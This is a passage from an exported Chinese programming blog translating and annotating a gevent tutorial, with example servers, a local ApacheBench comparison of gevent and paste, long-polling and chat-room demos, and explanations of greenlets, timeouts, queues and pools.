client])\n</pre></p>\n\n<p>执行结果:</p>\n\n<p>[root@248_STAT ~]# python test.py\n('Switched to Server for ', 1)\n('Switched to Client for ', 1)\n('Switched to Server for ', 2)\n('Switched to Client for ', 2)\n('Switched to Server for ', 3)\n('Switched to Client for ', 3)\n('Switched to Server for ', 4)\n('Switched to Client for ', 4)\n('Switched to Server for ', 5)\n('Switched to Client for ', 5)\n('Switched to Server for ', 6)\n('Switched to Client for ', 6)\n('Switched to Server for ', 7)\n('Switched to Client for ', 7)\n('Switched to Server for ', 8)\n('Switched to Client for ', 8)\n('Switched to Server for ', 9)\n('Switched to Client for ', 9)</p>\n\n<p>&nbsp;</p>\n\n<p>2 telnet 服务器</p>\n\n<p><pre class=\"sh_python\">\nfrom gevent.server import StreamServer #StreamServer是一个通用的TCP服务器</p>\n\n<p>def handle(socket, address):\n    socket.send(\"Hello from a telnet!\\n\")\n    for i in range(5):\n        socket.send(str(i) + '\\n') #给socket客户端发送数据\n    socket.close() #关闭客户端连接</p>\n\n<p>server = StreamServer(('127.0.0.1', 5000), handle) #当出现连接调用定义的方法handle\nserver.serve_forever()\n</pre></p>\n\n<p>执行结果:</p>\n\n<p>dongwm@localhost ~ $ nc 127.0.0.1 5000\nHello from a telnet!\n0\n1\n2\n3\n4\ndongwm@localhost ~ $ telnet 127.0.0.1 5000\nTrying 127.0.0.1...\nConnected to 127.0.0.1.\nEscape character is '^]'.\nHello from a telnet!\n0\n1\n2\n3\n4\nConnection closed by foreign host.\n<strong>3 wsgi服务器</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom gevent.wsgi import WSGIServer</p>\n\n<p>def application(environ, start_response):\n    status = '200 OK' #页面状态指定为200 ok\n    body = '&lt;p&gt;Hello World&lt;/p&gt;'</p>\n\n<p>    headers = [\n        ('Content-Type', 'text/html')\n    ]</p>\n\n<p>    start_response(status, headers)\n    return [body]</p>\n\n<p>WSGIServer(('', 8000), application).serve_forever() #启动一个占用8000端口的wsgi服务器\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_python\">\nfrom gevent.pywsgi import WSGIServer #使用pywsgi可以我们自己定义产生结果的处理引擎</p>\n\n<p>def application(environ, start_response):\n    status = '200 OK'</p>\n\n<p>    headers = [\n        ('Content-Type', 'text/html')\n    ]</p>\n\n<p>    start_response(status, headers)\n    yield \"&lt;p&gt;Hello\" #yield出数据\n    yield \"World&lt;/p&gt;\"</p>\n\n<p>WSGIServer(('', 8000), application).serve_forever()\n</pre></p>\n\n<p>我们看一个用ab(Apache Benchmark)的性能测试(更多信息请查看http://nichol.as/benchmark-of-python-web-servers),我这里只</p>\n\n<p>对比了gevent和paste的性能比(没做系统优化,只是在同样条件下看性能差距):</p>\n\n<p>paste的wsgi程序:</p>\n\n<p><pre class=\"sh_python\">\nfrom gevent.wsgi import WSGIServer</p>\n\n<p>def application(environ, start_response):\n    status = '200 OK'\n    body = '&lt;p&gt;Hello World&lt;/p&gt;'</p>\n\n<p>    headers = [\n        ('Content-Type', 'text/html')\n    ]</p>\n\n<p>    start_response(status, headers)\n    return [body]</p>\n\n<p>#WSGIServer(('', 8000), application).serve_forever()\nfrom paste import httpserver\nhttpserver.serve(application, '0.0.0.0', request_queue_size=500)\n</pre></p>\n\n<p>dongwm@localhost ~ $ /usr/sbin/ab2 -n 10000 -c 100 http://127.0.0.1:8000/ #gevent的性能,条件是:并发100,请求1W\nThis is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;\nCopyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/\nLicensed to The Apache Software Foundation, http://www.apache.org/</p>\n\n<p>Benchmarking 127.0.0.1 (be patient)\nCompleted 1000 requests\nCompleted 2000 requests\nCompleted 3000 requests\nCompleted 4000 requests\nCompleted 5000 requests\nCompleted 6000 requests\nCompleted 7000 requests\nCompleted 8000 requests\nCompleted 9000 requests\nCompleted 10000 requests\nFinished 10000 requests</p>\n\n<p>Server Software:\nServer Hostname:        127.0.0.1\nServer Port:            8000</p>\n\n<p>Document Path:          /\nDocument Length:        18 bytes</p>\n\n<p>Concurrency Level:      100\nTime taken for tests:   2.805 seconds\nComplete requests:      10000\nFailed requests:        0\nWrite errors:           0\nTotal transferred:      1380000 bytes\nHTML transferred:       180000 bytes\nRequests per second:    3564.90 [#/sec] (mean)\nTime per request:       28.051 [ms] (mean)\nTime per request:       0.281 [ms] (mean, across all concurrent requests)\nTransfer rate:          480.43 [Kbytes/sec] received</p>\n\n<p>Connection Times (ms)\nmin  mean[+/-sd] median   max\nConnect:        0    0   0.2      0       2\nProcessing:     2   28  15.1     27      69\nWaiting:        1   28  15.1     27      69\nTotal:          2   28  15.1     27      69</p>\n\n<p>Percentage of the requests served within a certain time (ms)\n50%     27\n66%     35\n75%     40\n80%     42\n90%     48\n95%     54\n98%     59\n99%     62\n100%     69 (longest request)</p>\n\n<p>dongwm@localhost ~ $ /usr/sbin/ab2 -n 10000 -c 100 http://127.0.0.1:8080/  #paste的性能\nThis is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt;\nCopyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/\nLicensed to The Apache Software Foundation, http://www.apache.org/</p>\n\n<p>Benchmarking 127.0.0.1 (be patient)\nCompleted 1000 requests\nCompleted 2000 requests\nCompleted 3000 requests\nCompleted 4000 requests\nCompleted 5000 requests\nCompleted 6000 requests\nCompleted 7000 requests\nCompleted 8000 requests\nCompleted 9000 requests\nCompleted 10000 requests\nFinished 10000 requests</p>\n\n<p>Server Software:        PasteWSGIServer/0.5\nServer Hostname:        127.0.0.1\nServer Port:            8080</p>\n\n<p>Document Path:          /\nDocument Length:        18 bytes</p>\n\n<p>Concurrency Level:      100\nTime taken for tests:   4.119 seconds\nComplete requests:      10000\nFailed requests:        0\nWrite errors:           0\nTotal transferred:      1600000 bytes\nHTML transferred:       180000 bytes\nRequests per second:    2427.52 [#/sec] (mean)\nTime per request:       41.194 [ms] (mean)\nTime per request:       0.412 [ms] (mean, across all concurrent requests)\nTransfer rate:          379.30 [Kbytes/sec] received</p>\n\n<p>Connection Times (ms)\nmin  mean[+/-sd] median   max\nConnect:        0    0   0.2      0       2\nProcessing:     2   41   5.4     41     107\nWaiting:        1   41   5.2     40      97\nTotal:          4   41   5.3     41     107</p>\n\n<p>Percentage of the requests served within a certain time (ms)\n50%     41\n66%     41\n75%     42\n80%     43\n90%     46\n95%     50\n98%     56\n99%     59\n100%    107 (longest request)</p>\n\n<p><strong>很不好理解吧,那我把数据直接整理下:</strong></p>\n\n<p>1 测试用时:</p>\n\n<p>Time taken for tests:   2.805 seconds #gevent</p>\n\n<p>Time taken for tests:   4.119 seconds #paste 花费时间更长\n2 每秒请求数:</p>\n\n<p>Requests per second:    3564.90 [#/sec] (mean) #gevent的嘛,每秒请求数大的多\nRequests per second:    2427.52 [#/sec] (mean) #paste</p>\n\n<p>3 每请求数耗时:</p>\n\n<p>Time per request:       28.051 [ms] (mean) #gevent耗时少\nTime per request:       0.281 [ms] (mean, across all concurrent requests) #gevent并发请求时耗时少\nTime per request:       41.194 [ms] (mean) #paste\nTime per request:       0.412 [ms] (mean, across all concurrent requests) #paste</p>\n\n<p>4 传输效率:</p>\n\n<p>Transfer rate:          448.26 [Kbytes/sec] received #gevent的效率更高\nTransfer rate:          379.30 [Kbytes/sec] received #paste</p>\n\n<p>5 连接消耗的时间的分解:</p>\n\n<p>Connection Times (ms)\nmin  mean[+/-sd] median   max\nConnect:        0    0   0.2      0       2\nProcessing:     2   28  15.1     27      69\nWaiting:        1   28  15.1     27      69\nTotal:          2   28  15.1     27      69</p>\n\n<p>Connection Times (ms) #paste\nmin  mean[+/-sd] median   max\nConnect:        0    0   0.2      0       2\nProcessing:     2   41   5.4     41     107\nWaiting:        1   41   5.2     40      97\nTotal:          4   41   5.3     41     107 #明显其中最大用时107/97都大于gevent的69ms,最小用时gevent略强</p>\n\n<p>6 整个场景中所有请求的响应情况。在场景中每个请求都有一个响应时间</p>\n\n<p>Percentage of the requests served within a certain time (ms) #gevent\n50%     29\n66%     31\n75%     34\n80%     34\n90%     36\n95%     38\n98%     42\n99%     44\n100%     71 (longest request)</p>\n\n<p>可以这样理解:50%用户效应小于29ms,60%用户响应小于31ms,最长的访问响应为71ms\nPercentage of the requests served within a certain time (ms) #paste\n50%     41\n66%     41\n75%     42\n80%     43\n90%     46\n95%     50\n98%     56\n99%     59\n100%    107 (longest request)  #很明显,无论那个区间,paste性能都略差</p>\n\n<p><strong>4 长轮询</strong></p>\n\n<p><pre class=\"sh_python\">\nimport gevent\nfrom gevent.queue import Queue, Empty\nfrom gevent.pywsgi import WSGIServer\nimport json</p>\n\n<p>data_source = Queue()</p>\n\n<p>def producer():\n    while True:\n        data_source.put_nowait('Hello World') #往队列非阻塞的放入数据\n        gevent.sleep(1)</p>\n\n<p>def ajax_endpoint(environ, start_response):\n    status = '200 OK'\n    headers = [\n        ('Content-Type', 'application/json') #设定<span>网络文件的类型</span>是json\n    ]\n    try:\n        datum = data_source.get(timeout=5)\n    except Empty:\n        datum = [] #假如gevent.sleep的时间设置的长一些(比如5s),在不停刷新过程中会获得空列表</p>\n\n<p>    start_response(status, headers)\n    return json.dumps(datum) #返回数据,打印出来的数据是一个带引号的字符串</p>\n\n<p>gevent.spawn(producer)</p>\n\n<p>WSGIServer(('', 8000), ajax_endpoint).serve_forever()\n</pre>\n<strong>4 聊天室</strong>(源码在这里https://github.com/sdiehl/minichat.git):</p>\n\n<p><pre class=\"sh_python\">\nfrom gevent import monkey\nmonkey.patch_all() #给模块打包\nfrom flask import Flask, render_template, request, json #作者在这里使用了flask框架,当然你也可以用其它比如django.tornado,bottle等</p>\n\n<p>from gevent import queue\nfrom gevent.pywsgi import WSGIServer</p>\n\n<p>app = Flask(__name__) \napp.debug = True</p>\n\n<p>class Room(object):</p>\n\n<p>    def __init__(self):\n        self.users = set()\n        self.messages = []</p>\n\n<p>    def backlog(self, size=25):\n        return self.messages[-size:]</p>\n\n<p>    def subscribe(self, user):\n        self.users.add(user)</p>\n\n<p>    def add(self, message):\n        for user in self.users:\n            print user\n            user.queue.put_nowait(message)\n        self.messages.append(message)</p>\n\n<p>class User(object):</p>\n\n<p>    def __init__(self):\n        self.queue = queue.Queue()</p>\n\n<p>rooms = {\n    'python': Room(),\n    'django': Room(),\n}</p>\n\n<p>users = {}</p>\n\n<p>@app.route('/') #flask指定url的处理使用路由的方式,访问页面地址根目录就会执行choose_name\ndef choose_name():\n    return render_template('choose.html') #然后调用模板choose.html,这个html文件最后使用了GET方法提交了一个uid页面(/&lt;uid&gt;)</p>\n\n<p>@app.route('/&lt;uid&gt;') #请求被转到了这里\ndef main(uid):\n    return render_template('main.html', #调用模板提供几个room的连接\n        uid=uid,\n        rooms=rooms.keys() #格局选择的连接,通过GET方法转到那个相应url:/&lt;room&gt;/&lt;uid&gt;\n    )</p>\n\n<p>@app.route('/&lt;room&gt;/&lt;uid&gt;') #请求被转到了这里\ndef join(room, uid):\n    user = users.get(uid, None)</p>\n\n<p>    if not user:\n        users[uid] = user = User()</p>\n\n<p>    active_room = rooms[room]\n    active_room.subscribe(user)\n    print 'subscribe', active_room, user</p>\n\n<p>    messages = active_room.backlog()</p>\n\n<p>    return render_template('room.html', #room.html包含一个POST提交方式,把你的聊天数据提交,并且更新页面(通过jquery的ajax调用url/poll/&lt;uid&gt;)\n        room=room, uid=uid, messages=messages)</p>\n\n<p>@app.route(\"/put/&lt;room&gt;/&lt;uid&gt;\", methods=[\"POST\"]) #通过这个url\ndef put(room, uid):\n    user = users[uid]\n    room = rooms[room]</p>\n\n<p>    message = request.form['message']\n    room.add(':'.join([uid, message]))</p>\n\n<p>    return ''</p>\n\n<p>@app.route(\"/poll/&lt;uid&gt;\", methods=[\"POST\"])\ndef poll(uid):\n    try:\n        msg = users[uid].queue.get(timeout=10)\n    except queue.Empty:\n        msg = []\n    return json.dumps(msg) #返回队列中包含的聊天记录</p>\n\n<p>if __name__ == \"__main__\":\n    http = WSGIServer(('', 5000), app)\n    http.serve_forever()\n</pre></p>\n\n<p>来一个更复杂带有前台后端的模型(例子来自http://blog.pythonisito.com/2011/07/gevent-zeromq-websockets-and-flot-ftw.html):</p>\n\n<p>源码在:http://dl.dropbox.com/u/24086834/blog/20110723/zmq_websocket.tar.gz</p>\n\n<p>其中需要修改graph.js第二行:</p>\n\n<p>var ws = new WebSocket(\"ws://localhost:9999/test\");</p>\n\n<p>为:</p>\n\n<p>var ws = new MozWebSocket(\"ws://localhost:9999/test\");  #因为我的火狐用的websocket不同</p>\n\n<p>这个demo.py,我来解析下:</p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport time\nimport math\nimport json\nimport webbrowser</p>\n\n<p>import paste.urlparser #paste是一个WSGI工具包，在WSGI的基础上包装了几层，让应用管理和实现变得方便</p>\n\n<p>import gevent\nfrom gevent_zeromq import zmq\nfrom geventwebsocket.handler import WebSocketHandler #基于gevent的pywsgi的WebSocket的处理程序</p>\n\n<p>def main(): #主方法\n    context = zmq.Context()\n    gevent.spawn(zmq_server, context) #上个例子使用joinall,这个例子是spawn+start,context是参数,也就是实例化的GreenContext\n    ws_server = gevent.pywsgi.WSGIServer(\n        ('', 9999), WebSocketApp(context),\n        handler_class=WebSocketHandler)\n    http_server = gevent.pywsgi.WSGIServer(\n        ('', 8000),\n        paste.urlparser.StaticURLParser(os.path.dirname(__file__))) # paste.urlparser用来处理url和静态文件\n    http_server.start()  #启动grennlet实例\n    ws_server.start()\n    webbrowser.open('http://localhost:8000/graph.html') #启动浏览器看这个页面,当正常启动后js会画图\n    zmq_producer(context)</p>\n\n<p>def zmq_server(context):\n    sock_incoming = context.socket(zmq.SUB)\n    sock_outgoing = context.socket(zmq.PUB)\n    sock_incoming.bind('tcp://*:5000') #发布绑定\n    sock_outgoing.bind('inproc://queue') #订阅绑定,本地(通过内存)进程（线程间）通信传输\n    sock_incoming.setsockopt(zmq.SUBSCRIBE, \"\") #这里表示对发布的所有信息都订阅\n    while True:\n        msg = sock_incoming.recv()\n        sock_outgoing.send(msg)</p>\n\n<p>class WebSocketApp(object):</p>\n\n<p>    def __init__(self, context):\n        self.context = context</p>\n\n<p>    def __call__(self, environ, start_response): \n        ws = environ['wsgi.websocket']\n        sock = self.context.socket(zmq.SUB) \n        sock.setsockopt(zmq.SUBSCRIBE, \"\") #订阅所有信息\n        sock.connect('inproc://queue') #websocket连接到订阅的地址\n        while True:\n            msg = sock.recv()\n            ws.send(msg)</p>\n\n<p>def zmq_producer(context):  #发布的方法\n    socket = context.socket(zmq.PUB)\n    socket.connect('tcp://127.0.0.1:5000') #绑定到发布的socket</p>\n\n<p>    while True:\n        x = time.time() * 1000\n        y = 2.5 * (1 + math.sin(x / 500))\n        socket.send(json.dumps(dict(x=x, y=y))) #往发布socket发送数据,这样,数据会被inproc://queue订阅,而被websocket获取,根据数据展示\n        gevent.sleep(0.05)</p>\n\n<p>if __name__ == '__main__':\n    main()\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "26"
    }
  },
  {
    "id": 247,
    "title": "关于gevent的一些理解(一)",
    "category": "gevent",
    "tags": [
      "gevent"
    ],
    "url": "/archives/guanyugeventdeyixielijieyi-2/",
    "content": "<p>前言:gevent是python的一个并发框架,以微线程greenlet为核心，使用了epoll事件监听机制以及诸多其他优化而变得高效.而且其中有个monkey类,\n将现有基于Python线程直接转化为greenlet(类似于打patch).他和线程框架性能比高大概4倍(看下图,是gevent和paste的对比):</p>\n\n<p><img class=\"alignnone\" title=\"性能\" src=\"http://code.mixpanel.com/wp-content/uploads/2010/10/performance2.png\" alt=\"\" width=\"664\" height=\"389\" /></p>\n\n<p>工作暂时没有用gevent的地方,这里就简单的对http://sdiehl.github.com/gevent-tutorial的一些例子和内容翻译:</p>\n\n<p><strong>1 同步和异步</strong></p>\n\n<p><pre class=\"sh_python\">\nimport gevent</p>\n\n<p>def foo():\n    print('Running in foo')\n    gevent.sleep(0) #让当前的greenlet睡眠N秒,这0标识控制其它协程而不会让其它进程睡眠\n    print('Explicit context switch to foo again')</p>\n\n<p>def bar():\n    print('Explicit context to bar')\n    gevent.sleep(0)\n    print('Implicit context switch back to bar')</p>\n\n<p>gevent.joinall([  #<tt>gevent.Greenlet</tt>实例,直到这个greenlet完成或者超时\n    gevent.spawn(foo),  #spawn可以实现一个grennlet实例并且加到队列并且启动,效果类似于gevent.Greenlet(foo).start()\n    gevent.spawn(bar),\n])\n</pre></p>\n\n<p>执行结果的效果图:</p>\n\n<p><img class=\"alignnone\" title=\"效果\" src=\"http://sdiehl.github.com/gevent-tutorial/flow.gif\" alt=\"\" width=\"284\" height=\"277\" /></p>\n\n<p>dongwm@localhost ~ $ python test.py\nExplicit context to bar\nRunning in foo\nExplicit context switch to foo again\nImplicit context switch back to bar</p>\n\n<p><pre class=\"sh_python\">\nimport time\nimport gevent\nfrom gevent import select #类似于内置的<tt>select.select()</tt>实现(请关注http://www.dongwm.com/archives/guanyuselectyanjiu/),只是将线程操作改成了greenlet</p>\n\n<p>start = time.time()\ntic = lambda: 'at %1.1f seconds' % (time.time() - start)</p>\n\n<p>def gr1():\n    print('Started Polling: ', tic())\n    select.select([], [], [], 2)  #参数分别是,等待的可读列表,等待的可写列表,等待的可执行列表,超时时间(这里是2秒)\n    print('Ended Polling: ', tic())</p>\n\n<p>def gr2():\n    print('Started Polling: ', tic())\n    select.select([], [], [], 2)\n    print('Ended Polling: ', tic())</p>\n\n<p>def gr3():\n    print(\"Hey lets do some stuff while the greenlets poll, at\", tic())\n    gevent.sleep(1)</p>\n\n<p>gevent.joinall([\n    gevent.spawn(gr1),\n    gevent.spawn(gr2),\n    gevent.spawn(gr3),\n])\n</pre></p>\n\n<p>执行结果:</p>\n\n<p>dongwm@localhost ~ $ python test.py\n('Hey lets do some stuff while the greenlets poll, at', 'at 0.0 seconds')  #因为gr1和gr2开始是阻塞的,gr3直接打印\n('Started Polling: ', 'at 0.0 seconds')\n('Started Polling: ', 'at 0.0 seconds')\n('Ended Polling: ', 'at 2.0 seconds')\n('Ended Polling: ', 'at 2.0 seconds')\n<pre class=\"sh_python\">\nimport gevent\nimport random</p>\n\n<p>def task(pid):\n    gevent.sleep(random.randint(0,2)*0.001)\n    print('Task', pid, 'done')</p>\n\n<p>def synchronous():  #同步\n    for i in range(1,10):\n        task(i)</p>\n\n<p>def asynchronous(): #异步\n    threads = [gevent.spawn(task, i) for i in xrange(10)]\n    gevent.joinall(threads)</p>\n\n<p>print('Synchronous:')\nsynchronous()</p>\n\n<p>print('Asynchronous:')\nasynchronous()\n</pre></p>\n\n<p>执行结果:</p>\n\n<p>dongwm@localhost ~ $ python test.py\nSynchronous:  #协程不会控制其它进程睡眠,所以挨个执行\n('Task', 1, 'done')\n('Task', 2, 'done')\n('Task', 3, 'done')\n('Task', 4, 'done')\n('Task', 5, 'done')\n('Task', 6, 'done')\n('Task', 7, 'done')\n('Task', 8, 'done')\n('Task', 9, 'done')\nAsynchronous:  #他们放在grennlet里面,sleep的时间是随机的,完成顺序也就不同了\n('Task', 2, 'done')\n('Task', 3, 'done')\n('Task', 5, 'done')\n('Task', 7, 'done')\n('Task', 9, 'done')\n('Task', 6, 'done')\n('Task', 1, 'done')\n('Task', 0, 'done')\n('Task', 8, 'done')\n('Task', 4, 'done')\n<pre class=\"sh_python\">\nimport gevent\nfrom gevent import Greenlet</p>\n\n<p>def foo(message, n):\n    gevent.sleep(n)\n    print(message)</p>\n\n<p>thread1 = Greenlet.spawn(foo, \"Hello\", 1)  #实例化Greenlet\nthread2 = gevent.spawn(foo, \"I live!\", 2) #实例化gevent,其实也是创建Greenlet实例,只是包装了一下\nthread3 = gevent.spawn(lambda x: (x+1), 2)  #一个lambda表达式</p>\n\n<p>threads = [thread1, thread2, thread3]\ngevent.joinall(threads) #等待所有greenlet完成\n</pre></p>\n\n<p>执行结果:</p>\n\n<p>dongwm@localhost ~ $ python test.py\nHello\nI live!  #打印出来效果不明显,事实上等待一秒打印第一行,再等待一秒打印第二行,然后马上完成(lambda没有显示)</p>\n\n<p><pre class=\"sh_python\">\nimport gevent\nfrom gevent import Greenlet</p>\n\n<p>class MyGreenlet(Greenlet):  #重载Greenlet类</p>\n\n<p>    def __init__(self, message, n):\n        Greenlet.__init__(self)\n        self.message = message\n        self.n = n</p>\n\n<p>    def _run(self): #重写_run方法\n        print(self.message)\n        gevent.sleep(self.n)</p>\n\n<p>g = MyGreenlet(\"Hi there!\", 3)\ng.start()\ng.join()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport gevent</p>\n\n<p>def win():\n    return 'You win!'</p>\n\n<p>def fail():\n    raise Exception('You fail at failing.')</p>\n\n<p>winner = gevent.spawn(win)\nloser = gevent.spawn(fail)</p>\n\n<p>print(winner.started) # started表示的Greenlet是否已经开始,返回布尔值\nprint(loser.started)  # True</p>\n\n<p>try:\n    gevent.joinall([winner, loser])\nexcept Exception as e:\n    print('This will never be reached')</p>\n\n<p>print(winner.value) # value表示greenlet实例返回值:'You win!'\nprint(loser.value)  # None</p>\n\n<p>print(winner.ready()) # 是否已停止Greenlet的布尔值,True\nprint(loser.ready())  # True</p>\n\n<p>print(winner.successful()) # 表示的Greenlet是否已成功停止，而不是抛出异常,True\nprint(loser.successful())  # False\nprint(loser.exception) #打印异常的报错信息\n</pre></p>\n\n<p>执行结果:</p>\n\n<p>dongwm@localhost ~ $ python test.py\nTrue\nTrue\nTraceback (most recent call last):\nFile \"/usr/lib/python2.7/site-packages/gevent-1.0dev-py2.7-linux-i686.egg/gevent/greenlet.py\", line 328, in run\nresult = self._run(*self.args, **self.kwargs)\nFile \"test.py\", line 7, in fail\nraise Exception('You fail at failing.')\nException: You fail at failing.\n&lt;Greenlet at 0xb73cd39cL: fail&gt; failed with Exception</p>\n\n<p>You win!\nNone\nTrue\nTrue\nTrue\nFalse\nYou fail at failing.\n<pre class=\"sh_python\">\nimport gevent\nfrom gevent import Timeout</p>\n\n<p>seconds = 10</p>\n\n<p>timeout = Timeout(seconds)\ntimeout.start()</p>\n\n<p>def wait():\n    gevent.sleep(10)</p>\n\n<p>try:\n    gevent.spawn(wait).join()\nexcept Timeout:\n    print 'Could not complete'\n</pre></p>\n\n<p>上面的例子是可以执行完成的,但是假如修改seconds = 5,让数值少入sleep,那么就会有超时被捕捉到</p>\n\n<p>还可以使用with关键字处理上下文:</p>\n\n<p><pre class=\"sh_python\">\nimport gevent\nfrom gevent import Timeout</p>\n\n<p>time_to_wait = 5 # seconds</p>\n\n<p>class TooLong(Exception):\n    pass</p>\n\n<p>with Timeout(time_to_wait, TooLong):\n    gevent.sleep(10)\n</pre></p>\n\n<p>以及其他的方式的:</p>\n\n<p><pre class=\"sh_python\">\nimport gevent\nfrom gevent import Timeout</p>\n\n<p>def wait():\n    gevent.sleep(2)</p>\n\n<p>timer = Timeout(1).start()\nthread1 = gevent.spawn(wait)  #这种超时类型前面讲过</p>\n\n<p>try:\n    thread1.join(timeout=timer)\nexcept Timeout:\n    print('Thread 1 timed out')</p>\n\n<p>timer = Timeout.start_new(1) #start_new是一个快捷方式\nthread2 = gevent.spawn(wait)</p>\n\n<p>try:\n    thread2.get(timeout=timer) #get返回greenlet的结果,包含异常\nexcept Timeout:\n    print('Thread 2 timed out')</p>\n\n<p>try:\n    gevent.with_timeout(1, wait) #如果超时前返回异常,取消这个方法\nexcept Timeout:\n    print('Thread 3 timed out')\n</pre></p>\n\n<p><strong>2 数据结构</strong></p>\n\n<p><pre class=\"sh_python\">\nimport gevent\nfrom gevent.event import AsyncResult</p>\n\n<p>a = AsyncResult() #保存一个值或者一个异常的事件实例</p>\n\n<p>def setter():\n    gevent.sleep(3)  #3秒后唤起所有线程的a的值\n    a.set() #保存值,唤起等待线程</p>\n\n<p>def waiter():\n    a.get() # 3秒后get方法不再阻塞,返回存贮的值或者异常\n    print 'I live!'</p>\n\n<p>gevent.joinall([\n    gevent.spawn(setter),\n    gevent.spawn(waiter),\n])\n</pre></p>\n\n<p>更清晰的例子:</p>\n\n<p><pre class=\"sh_python\">\nimport gevent\nfrom gevent.event import AsyncResult\na = AsyncResult()</p>\n\n<p>def setter():\n    gevent.sleep(3)\n    a.set('Hello!')</p>\n\n<p>def waiter():\n    print a.get()</p>\n\n<p>gevent.joinall([\n    gevent.spawn(setter),\n    gevent.spawn(waiter),\n])\n</pre>\n<pre class=\"sh_python\">\nimport gevent\nfrom gevent.queue import Queue  #类似于内置的Queue</p>\n\n<p>tasks = Queue() #队列实例</p>\n\n<p>def worker(n):\n    while not tasks.empty():\n        task = tasks.get()\n        print('Worker %s got task %s' % (n, task))\n        gevent.sleep(0)</p>\n\n<p>    print('Quitting time!')</p>\n\n<p>def boss():\n    for i in xrange(1,25):\n        tasks.put_nowait(i) #非阻塞的把数据放到队列里面</p>\n\n<p>gevent.spawn(boss).join()</p>\n\n<p>gevent.joinall([\n    gevent.spawn(worker, 'steve'),\n    gevent.spawn(worker, 'john'),\n    gevent.spawn(worker, 'nancy'),\n])\n</pre></p>\n\n<p>执行结果:</p>\n\n<p>[root@248_STAT ~]# python !$\npython test.py\nWorker steve got task 1 #3个用户循环的取出数据\nWorker john got task 2\nWorker nancy got task 3\nWorker steve got task 4\nWorker nancy got task 5\nWorker john got task 6\nWorker steve got task 7\nWorker john got task 8\nWorker nancy got task 9\nWorker steve got task 10\nWorker nancy got task 11\nWorker john got task 12\nWorker steve got task 13\nWorker john got task 14\nWorker nancy got task 15\nWorker steve got task 16\nWorker nancy got task 17\nWorker john got task 18\nWorker steve got task 19\nWorker john got task 20\nWorker nancy got task 21\nWorker steve got task 22\nWorker nancy got task 23\nWorker john got task 24\nQuitting time!\nQuitting time!\nQuitting time!</p>\n\n<p>一个更复杂的例子:\n<pre class=\"sh_python\">\nimport gevent\nfrom gevent.queue import Queue, Empty</p>\n\n<p>tasks = Queue(maxsize=3)  #限制队列的长度</p>\n\n<p>def worker(n):\n    try:\n        while True:\n            task = tasks.get(timeout=1) # 减少队列,超时为1秒\n            print('Worker %s got task %s' % (n, task))\n            gevent.sleep(0)\n    except Empty:\n        print('Quitting time!')</p>\n\n<p>def boss():\n    \"\"\"\n    Boss will wait to hand out work until a individual worker is\n    free since the maxsize of the task queue is 3.\n    \"\"\"</p>\n\n<p>    for i in xrange(1,10):\n        tasks.put(i)  #这里boss没有盲目的不停放入数据,而是在当最大三个队列数有空余才放入数据,事实上方法转换过程中,boss放入三个数据,worker取出三个数据,boss再放入数据....\n    print('Assigned all work in iteration 1')</p>\n\n<p>    for i in xrange(10,20):\n        tasks.put(i)\n    print('Assigned all work in iteration 2')</p>\n\n<p>gevent.joinall([\n    gevent.spawn(boss),\n    gevent.spawn(worker, 'steve'),\n    gevent.spawn(worker, 'john'),\n    gevent.spawn(worker, 'bob'),\n])\n</pre>\n<pre class=\"sh_python\">\nimport gevent\nfrom gevent.pool import Group \ndef talk(msg):\n    for i in xrange(3):\n        print(msg)</p>\n\n<p>g1 = gevent.spawn(talk, 'bar')\ng2 = gevent.spawn(talk, 'foo')\ng3 = gevent.spawn(talk, 'fizz')</p>\n\n<p>group = Group() #保持greenlet实例的组运行,连接到没个项目,在其完成后删除\ngroup.add(g1)\ngroup.add(g2)\ngroup.join()</p>\n\n<p>group.add(g3)\ngroup.join()\n</pre></p>\n\n<p>看更加明确的例子:\n<pre class=\"sh_python\">\nimport gevent\nfrom gevent import getcurrent\nfrom gevent.pool import Group</p>\n\n<p>group = Group()</p>\n\n<p>def hello_from(n):\n    print('Size of group', len(group))\n    print('Hello from Greenlet %s' % id(getcurrent()))  #获取当前gevent实例的id</p>\n\n<p>group.map(hello_from, xrange(3)) #map迭代方法,参数为方法和其参数</p>\n\n<p>def intensive(n):\n    gevent.sleep(3 - n)\n    return 'task', n</p>\n\n<p>print('Ordered')</p>\n\n<p>ogroup = Group()\nfor i in ogroup.imap(intensive, xrange(3)):  #相当于 itertools.imap,返回一个迭代器, 它是调用了一个其值在输入迭代器上的函数, 返回结果. 它类似于函数 <tt>map()</tt> , 只是前者在\n#任意输入迭代器结束后就停止(而不是插入None值来补全所有的输入)\n    print(i)</p>\n\n<p>print('Unordered')</p>\n\n<p>igroup = Group()\nfor i in igroup.imap_unordered(intensive, xrange(3)):\n    print(i)\n</pre></p>\n\n<p>执行结果:</p>\n\n<p>[root@248_STAT ~]# python test.py\n('Size of group', 3)\nHello from Greenlet 314818960\n('Size of group', 3)\nHello from Greenlet 314819280\n('Size of group', 3)\nHello from Greenlet 314819440\nOrdered\n('task', 0)\n('task', 1)\n('task', 2)\nUnordered\n('task', 2)\n('task', 1)\n('task', 0)</p>\n\n<p>还能限制pool池的大小\n<pre class=\"sh_python\">\nimport gevent\nfrom gevent import getcurrent\nfrom gevent.pool import Pool</p>\n\n<p>pool = Pool(2)</p>\n\n<p>def hello_from(n):\n    print('Size of pool', len(pool))</p>\n\n<p>pool.map(hello_from, xrange(3))\n</pre></p>\n\n<p>返回结果:</p>\n\n<p>[root@248_STAT ~]# python test.py\n('Size of pool', 2)\n('Size of pool', 2)\n('Size of pool', 1) #因为上面的pool容纳不了第三个,这是一个新的pool</p>\n\n<p>以下是作者写的一个pool操作类:</p>\n\n<p><pre class=\"sh_python\">\nfrom gevent.pool import Pool</p>\n\n<p>class SocketPool(object):</p>\n\n<p>    def __init__(self):\n        self.pool = Pool(1000)  #设置池容量1000\n        self.pool.start()</p>\n\n<p>    def listen(self, socket):\n        while True:\n            socket.recv()</p>\n\n<p>    def add_handler(self, socket):\n        if self.pool.full(): #容量慢报错\n            raise Exception(\"At maximum pool size\")\n        else: #否则执行在新的grenlet里面执行listen方法\n            